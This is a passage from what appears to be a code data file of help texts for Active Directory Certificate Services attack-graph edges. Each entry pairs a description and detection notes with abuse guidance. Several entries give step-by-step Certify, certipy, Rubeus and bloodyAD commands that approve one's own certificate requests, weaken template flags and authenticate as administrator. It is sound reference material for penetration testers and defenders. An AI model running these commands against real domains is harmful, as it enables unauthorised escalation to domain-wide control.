      'Enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag generates a registry change event on the CA server. CA configuration changes may be logged in the CA audit log if auditing is enabled. Restarting the CertSvc service generates Event ID 7036 (Service Control Manager). Adding a Certificate Manager generates changes to the CA security descriptor. Monitor for CA configuration changes, especially to the EditFlags registry value under HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\<CA-Name>\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ManageCA',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312838191515-ManageCA',
      },
      {
        title: 'The Hacker Recipes - ESC7',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/ca-configuration#esc7-ca-permissions',
      },
    ],
  },
  {
    kind: 'ManageCertificates',
    category: 'ADCS',
    general:
      'The ManageCertificates edge indicates that a principal has the "Manage Certificates" (Certificate Manager / CA Officer) permission on a Certificate Authority. This permission allows the principal to approve or deny pending certificate requests, revoke issued certificates, and re-issue certificates. In the context of ESC7, if a certificate template requires CA manager approval, an attacker with ManageCertificates permission can submit a request (e.g., one with an arbitrary SAN) and then approve their own request. This bypasses the manager approval control that would otherwise prevent abuse.',
    windowsAbuse: `# Step 1: Verify ManageCertificates permission
Certify.exe cas

# Step 2: Submit a request for a template that requires manager approval
Certify.exe request /ca:CA.domain.local\\domain-CA /template:ManagerApprovalTemplate /altname:administrator
# Note the Request ID from the output

# Step 3: Approve the pending request using your ManageCertificates permission
certutil -config "CA.domain.local\\domain-CA" -resubmit <RequestID>

# Step 4: Download the issued certificate
certutil -config "CA.domain.local\\domain-CA" -retrieve <RequestID> cert.cer

# Step 5: Authenticate with the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate CA permissions
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1

# Step 2: Request a certificate (will be pending if manager approval required)
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template ManagerApprovalTemplate -upn administrator@domain.local
# Note the Request ID

# Step 3: Approve the request using ManageCertificates permission
certipy ca -ca 'domain-CA' -issue-request <RequestID> -u attacker@domain.local -p 'Password'

# Step 4: Retrieve the issued certificate
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -retrieve <RequestID>

# Step 5: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'The certificate request generates Event ID 4886, and the approval generates Event ID 4887 with details indicating manual approval. Monitor for the same principal both requesting and approving certificates, which is abnormal. CA audit logs (if enabled via "Audit Certificate Services" policy) record officer actions including request approvals. Event ID 4768 will log the final certificate-based authentication.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ManageCertificates',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312838191515-ManageCertificates',
      },
    ],
  },
  {
    kind: 'Enroll',
    category: 'ADCS',
    general:
      'The Enroll edge indicates that a principal has the Certificate-Enrollment extended right on a certificate template or CA. This permission allows the principal to request certificates from the specified template through the CA. Enrollment rights are necessary but not sufficient for exploitation — the template and CA configuration determine whether the enrollment can be weaponized (e.g., via ESC1, ESC2, ESC3, etc.). However, enrollment rights on templates with dangerous configurations are the foundation of most ADCS attack paths.',
    abuse:
      'Enrollment itself is a normal operation. The abuse depends on the template configuration. If the template allows SAN specification (ESC1), has the Certificate Request Agent EKU (ESC3), or the CA has dangerous flags (ESC6), the enrollment right becomes the enabler for privilege escalation. Use Certify.exe find /vulnerable or certipy find -vulnerable to identify which enrolled templates have exploitable configurations.',
    opsec:
      'Certificate enrollment generates Event ID 4886 (Certificate Services received a certificate request) and Event ID 4887 (Certificate Services approved a certificate request) on the CA. These are normal events in most environments, so detection requires baselining normal enrollment patterns and alerting on anomalies such as enrollment by unusual principals, enrollment in rarely-used templates, or enrollment with SAN values.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - Enroll',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-Enroll',
      },
    ],
  },
  {
    kind: 'EnrollOnBehalfOf',
    category: 'ADCS',
    general:
      'The EnrollOnBehalfOf edge indicates that a principal can use an enrollment agent certificate to request certificates on behalf of other users. This is the operational step in ESC3 — after obtaining a Certificate Request Agent certificate, the holder can co-sign certificate requests for other users against templates that allow enrollment on behalf of others. The resulting certificate is issued in the target user name and can be used for authentication as that user.',
    abuse:
      'This edge requires an enrollment agent certificate (obtained via ESC3 step 1). Use Certify.exe request /ca:CA\\CA-Name /template:TargetTemplate /onbehalfof:DOMAIN\\administrator /enrollcert:agent.pfx (Windows) or certipy req -ca CA-Name -template TargetTemplate -on-behalf-of DOMAIN\\administrator -pfx agent.pfx (Linux) to request a certificate as the target user. The resulting certificate enables authentication as the impersonated user.',
    opsec:
      'Enrollment on behalf of another user generates Event IDs 4886/4887 on the CA, with the request showing the enrollment agent as the requester and the target user as the subject. Monitor for enrollment agent certificates being used, as they are rare in most environments. Certificate Manager restrictions on the CA can limit which users an enrollment agent can enroll for, providing defense-in-depth.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'The Hacker Recipes - Enrollment Agent (ESC3)',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-enrollment-agent',
      },
    ],
  },
  {
    kind: 'DelegatedEnrollmentAgent',
    category: 'ADCS',
    general:
      'The DelegatedEnrollmentAgent edge indicates that a principal has been granted delegated enrollment agent permissions, allowing them to request certificates on behalf of a specific set of users or groups. Unlike full enrollment agent rights, delegated enrollment agent permissions are scoped — the CA configuration specifies which principals the agent can enroll for and which templates they can use. This is configured via Certificate Manager restrictions on the CA and provides more granular control than blanket enrollment agent permissions.',
    abuse:
      'If the delegation scope includes high-value targets, this edge enables the same ESC3-style attack but limited to the delegated scope. Request an enrollment agent certificate, then use it to enroll on behalf of users within the delegated scope. If the scope includes Domain Admins or other privileged users, this is a direct privilege escalation path.',
    opsec:
      'Certificate enrollment generates Event IDs 4886/4887. The delegated scope can be audited via the CA MMC snap-in under Certificate Manager Restrictions. Monitor for enrollment agent certificate usage and cross-reference with the configured delegation scope. Unexpected on-behalf-of requests outside the normal business process should be investigated.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Certificate Manager Restrictions',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage/restrict-certificate-managers',
      },
    ],
  },
  {
    kind: 'WritePKIEnrollmentFlag',
    category: 'ADCS',
    general:
      'The WritePKIEnrollmentFlag edge indicates that a principal can modify the msPKI-Enrollment-Flag attribute on a certificate template. This attribute controls enrollment behavior including whether manager approval is required (CT_FLAG_PEND_ALL_REQUESTS), whether the CT_FLAG_NO_SECURITY_EXTENSION flag is set (which removes the SID-based security extension from issued certificates, enabling ESC9), and other enrollment settings. An attacker can remove the manager approval requirement or set flags that weaken certificate security.',
    windowsAbuse: `# Step 1: Read current enrollment flags
Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties msPKI-Enrollment-Flag,cn | Select cn,msPKI-Enrollment-Flag

# Step 2: Remove manager approval requirement (clear CT_FLAG_PEND_ALL_REQUESTS = 0x2)
Set-ADObject -Identity "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Enrollment-Flag'=0}

# Step 3: Or set CT_FLAG_NO_SECURITY_EXTENSION to enable ESC9
# CT_FLAG_NO_SECURITY_EXTENSION = 0x00080000 = 524288
Set-ADObject -Identity "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Enrollment-Flag'=524288}`,
    linuxAbuse: `# Using bloodyAD to modify the enrollment flag
# Remove manager approval
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' --attr msPKI-Enrollment-Flag --value 0

# Or set CT_FLAG_NO_SECURITY_EXTENSION for ESC9
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' --attr msPKI-Enrollment-Flag --value 524288`,
    opsec:
      'Modification of certificate template attributes generates Event ID 5136 (A directory service object was modified) with the attribute name msPKI-Enrollment-Flag. Template modifications are uncommon in production and should be monitored closely. Changes to enrollment flags can convert a safe template into a vulnerable one, so baseline and alert on any msPKI-Enrollment-Flag changes.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Certificate Template Properties',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts',
      },
    ],
  },
  {
    kind: 'WritePKINameFlag',
    category: 'ADCS',
    general:
      'The WritePKINameFlag edge indicates that a principal can modify the msPKI-Certificate-Name-Flag attribute on a certificate template. This attribute controls how the subject name is constructed in issued certificates. The most critical flag is CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1), which allows the certificate requestor to specify an arbitrary Subject Alternative Name (SAN). Setting this flag converts the template into an ESC1-vulnerable template, enabling privilege escalation by requesting certificates with a privileged user in the SAN.',
    windowsAbuse: `# Step 1: Read current name flags
Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties msPKI-Certificate-Name-Flag,cn | Select cn,msPKI-Certificate-Name-Flag

# Step 2: Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (value = 1)
Set-ADObject -Identity "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Certificate-Name-Flag'=1}

# Step 3: Now exploit as ESC1
Certify.exe request /ca:CA.domain.local\\domain-CA /template:TargetTemplate /altname:administrator

# Step 4: Authenticate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Using bloodyAD to enable SAN specification
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' --attr msPKI-Certificate-Name-Flag --value 1

# Now exploit as ESC1
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template TargetTemplate -upn administrator@domain.local

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Modification of msPKI-Certificate-Name-Flag generates Event ID 5136. Setting CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is a critical configuration change that should trigger immediate alerts. This flag being set on any template should be regularly audited. After exploitation, standard ESC1 detection applies: Event IDs 4886/4887 for certificate operations and 4768 for authentication.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - WritePKINameFlag',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-WritePKINameFlag',
      },
    ],
  },
  {
    kind: 'HostsCAService',
    category: 'ADCS',
    general:
      'The HostsCAService edge indicates that a computer object hosts an Active Directory Certificate Services (ADCS) Certificate Authority. The CA service (CertSvc) runs on this computer and holds the CA private key, which is used to sign all issued certificates. Compromising the computer that hosts a CA service is particularly dangerous because it grants access to the CA private key (enabling Golden Certificate attacks), the CA configuration (enabling ESC6/ESC7), and the ability to issue, revoke, or modify certificates.',
    abuse:
      'If an attacker compromises the computer hosting the CA service, they can extract the CA private key using Mimikatz (crypto::capi, crypto::certificates), SharpDPAPI, or certipy ca -backup to enable Golden Certificate forgery. They can also directly modify CA configuration via certutil or the CA MMC snap-in. The CA computer should be treated as a Tier 0 asset equivalent to a Domain Controller.',
    opsec:
      'CA private key access generates Event ID 5058 (Key file operation) and Event ID 5061 (Cryptographic operation) on the CA server. CA service start/stop generates Event ID 7036 in the System log. Monitor for interactive logons (Event ID 4624 type 2/10) to CA servers, as these should be extremely rare and limited to PKI administrators. Unauthorized access to the CA server should be treated as a potential PKI compromise event.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Securing PKI Infrastructure',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/pki-design-considerations',
      },
    ],
  },
  {
    kind: 'PublishedTo',
    category: 'ADCS',
    general:
      'The PublishedTo edge indicates that a certificate template has been published to (made available on) an Enterprise CA. A template must be published to a CA before users can enroll using it. The CA maintains a list of published templates, and only published templates appear in enrollment requests. This edge is important for understanding which CAs can be used to exploit vulnerable templates — a vulnerable template is only exploitable through CAs where it is published.',
    abuse:
      'The PublishedTo relationship itself is informational. It connects a vulnerable template to the specific CA that can issue certificates from it. When planning an ADCS attack, you need to know which CA to target in your certificate request. Use Certify.exe cas or certipy find to enumerate which templates are published to which CAs.',
    opsec:
      'Publishing or unpublishing a template to/from a CA generates changes in the CA configuration. Monitoring template availability on CAs helps detect when new potentially vulnerable templates become available for enrollment. Event ID 5136 captures changes to the certificateTemplates attribute on the CA object in AD.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Manage Certificate Templates',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage/manage-certificate-templates',
      },
    ],
  },
  {
    kind: 'IssuedSignedBy',
    category: 'ADCS',
    general:
      'The IssuedSignedBy edge indicates that a CA certificate was issued and signed by another CA in the PKI hierarchy. In a multi-tier PKI deployment, subordinate (issuing) CAs have their certificates signed by a root CA or an intermediate CA. This chain of trust is critical because compromising a higher-level CA in the chain compromises all subordinate CAs and every certificate issued by them. The IssuedSignedBy relationship maps the PKI trust hierarchy.',
    abuse:
      'This relationship is informational for understanding the PKI trust chain. If a root CA is compromised, all subordinate CAs are effectively compromised because the attacker can forge certificates that chain to the root. In multi-tier deployments, the root CA is often offline, making the issuing CA the primary target. Understanding the IssuedSignedBy chain helps prioritize attack paths — compromise of a higher CA has broader impact.',
    opsec:
      'Changes to the PKI hierarchy (new CAs being added, CA certificate renewals) should be tightly controlled and monitored. CA certificate issuance is a rare event that should be logged and reviewed. Monitor the PKI containers in AD Configuration partition for new CA objects.',
    references: [
      {
        title: 'Microsoft - PKI Hierarchy Design',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/pki-design-considerations',
      },
    ],
  },
  {
    kind: 'NTAuthStoreFor',
    category: 'ADCS',
    general:
      'The NTAuthStoreFor edge indicates that the NTAuth certificate store is configured for a specific domain. The NTAuth store (CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration) contains the certificates of CAs that are trusted to issue certificates for NT (Windows) authentication. Only certificates issued by CAs listed in the NTAuth store can be used for smart card logon or PKINIT Kerberos authentication. This store is a critical trust anchor for all certificate-based authentication in the domain.',
    abuse:
      'If an attacker can add a rogue CA certificate to the NTAuth store, certificates issued by that rogue CA will be trusted for domain authentication. This requires write access to the NTAuthCertificates object in the Configuration partition, which typically requires Enterprise Admin or equivalent privileges. This is a persistence mechanism — a rogue CA in NTAuth enables long-term forged certificate authentication.',
    opsec:
      'Changes to the NTAuth store generate Event ID 5136 (directory service object modification) on the Configuration partition. Monitor for additions to the cACertificate attribute on the NTAuthCertificates object. Changes to NTAuth should be extremely rare and only occur when deploying new Enterprise CAs. Use certutil -viewstore -enterprise NTAuth to audit the store contents.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - NTAuth Store',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-role',
      },
    ],
  },
  {
    kind: 'TrustedForNTAuth',
    category: 'ADCS',
    general:
      'The TrustedForNTAuth edge indicates that a Certificate Authority is trusted for NT authentication — its certificate is present in the NTAuth store. This means certificates issued by this CA can be used for smart card logon, PKINIT Kerberos authentication, and other certificate-based Windows authentication methods. All Enterprise CAs are automatically added to NTAuth, but standalone CAs or third-party CAs must be explicitly added. This trust relationship is essential for ADCS attacks to succeed — a certificate is only useful for domain authentication if the issuing CA is in NTAuth.',
    abuse:
      'This relationship is informational but critical for attack path planning. ADCS exploitation (ESC1-ESC13, Golden Cert) only works for domain authentication if the exploited CA is trusted for NT auth. Verify CA trust status using certutil -viewstore -enterprise NTAuth or Certify.exe cas before attempting certificate-based authentication.',
    opsec:
      'Monitor the NTAuth store for unauthorized CA additions. Regularly audit which CAs are trusted for NT auth using certutil -viewstore -enterprise NTAuth. Removing a compromised CA from NTAuth immediately prevents its certificates from being used for authentication, providing a rapid containment mechanism.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Certificate Authority Trust',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-role',
      },
    ],
  },
  {
    kind: 'EnterpriseCAFor',
    category: 'ADCS',
    general:
      'The EnterpriseCAFor edge indicates that a Certificate Authority is an Enterprise CA for a specific domain. Enterprise CAs are integrated with Active Directory — they publish certificates to AD, use AD-based certificate templates, and automatically register their certificates in the NTAuth store. Enterprise CAs can issue certificates for smart card logon and other domain authentication purposes. This is in contrast to Standalone CAs, which are not AD-integrated and cannot directly issue certificates for domain authentication.',
    abuse:
      'This relationship is informational but essential for understanding which CAs can be targeted for ADCS attacks. Enterprise CAs are the relevant targets because they are automatically trusted for NT authentication and use AD-based templates that may be misconfigured. Standalone CAs are generally not useful for ADCS privilege escalation attacks.',
    opsec:
      'New Enterprise CA deployment generates changes in the Configuration partition of AD and automatically adds the CA to the NTAuth store. Monitor for new CA objects in CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration. Enterprise CA deployment should be a rare, carefully planned event.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'Microsoft - Enterprise CA vs Standalone CA',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certification-authority-role',
      },
    ],
  },
  {
    kind: 'RootCAFor',
    category: 'ADCS',
    general:
      'The RootCAFor edge indicates that a Certificate Authority is the root CA for a domain PKI hierarchy. The root CA is the trust anchor — its self-signed certificate is the top of the certificate chain. All certificates ultimately chain back to the root CA. In most deployments, the root CA is an offline standalone CA (kept physically secure and not connected to the network) while subordinate Enterprise CAs handle day-to-day certificate issuance. Compromising the root CA private key enables forging any certificate in the hierarchy.',
    abuse:
      'Root CA compromise has the broadest impact — it enables forging certificates for any subordinate CA, which in turn enables forging any end-entity certificate. If the root CA is online (a common misconfiguration, especially in smaller environments), it is a high-value target. The root CA certificate is distributed via Group Policy and stored in the Trusted Root Certification Authorities store on all domain members.',
    opsec:
      'Root CA access should be extremely restricted and audited. In a properly designed PKI, the root CA is offline and only brought online for CA certificate renewals or subordinate CA certificate issuance. Monitor for any network access to root CA systems. The root CA certificate in the Configuration partition should be baselined and monitored for changes.',
    references: [
      {
        title: 'Microsoft - PKI Design Best Practices',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/pki-design-considerations',
      },
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
    ],
  },
  {
    kind: 'ExtendedByPolicy',
    category: 'ADCS',
    general:
      'The ExtendedByPolicy edge indicates that a certificate template is extended by an issuance policy. Issuance policies (also called certificate policies) are OIDs that define conditions under which a certificate is issued and the purposes for which it can be used. When a template has an issuance policy, the CA evaluates the policy during enrollment. Issuance policies can be linked to security groups via the msDS-OIDToGroupLink attribute, which is the foundation of ESC13 — enrollment in such a template effectively grants group membership in the linked security group.',
    abuse:
      'If the issuance policy associated with this template has an msDS-OIDToGroupLink pointing to a privileged security group, enrolling in this template grants effective membership in that group during certificate-based authentication (ESC13). Use certipy find -vulnerable or LDAP queries to check if the issuance policy OID has a group link.',
    opsec:
      'Monitor for changes to the msPKI-Certificate-Policy attribute on certificate templates (Event ID 5136) and changes to the msDS-OIDToGroupLink attribute on OID objects. New issuance policy assignments to templates should be reviewed for potential ESC13 conditions.',
    references: [
      {
        title: 'SpecterOps - ADCS ESC13',
        url: 'https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac',
      },
      {
        title: 'Microsoft - Certificate Issuance Policies',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts',
      },
    ],
  },
  {
    kind: 'OIDGroupLink',
    category: 'ADCS',
    general:
      'The OIDGroupLink edge indicates that an OID (Object Identifier) object in the AD Configuration partition has the msDS-OIDToGroupLink attribute set, linking it to a security group. This is the foundational mechanism for ESC13. When this OID is used as an issuance policy on a certificate template, users who enroll in that template and authenticate with the resulting certificate will have the linked group SID included in their Kerberos PAC. This effectively grants group membership without the user actually being a member of the group in Active Directory.',
    abuse:
      'If the linked group is privileged (Domain Admins, Enterprise Admins, etc.), any user who can enroll in a template with this issuance policy gains the privileges of that group during certificate-based authentication. The OIDGroupLink creates a hidden privilege escalation path that bypasses normal group membership controls. To exploit: enroll in the template with the linked issuance policy, then authenticate with the certificate. The resulting TGT will include the linked group SID.',
    opsec:
      'The msDS-OIDToGroupLink attribute is rarely set in most environments. Monitor for changes to this attribute on OID objects in CN=OID,CN=Public Key Services,CN=Services,CN=Configuration via Event ID 5136. Audit all existing OIDGroupLink relationships and validate whether the linked groups are appropriate. Certificate-based authentication with unexpected group SIDs in the PAC is difficult to detect without inspecting Kerberos ticket contents.',
    references: [
      {
        title: 'SpecterOps - ADCS ESC13',
        url: 'https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac',
      },
      {
        title: 'Certipy - ESC13',
        url: 'https://github.com/ly4k/Certipy',
      },
    ],
  },
];
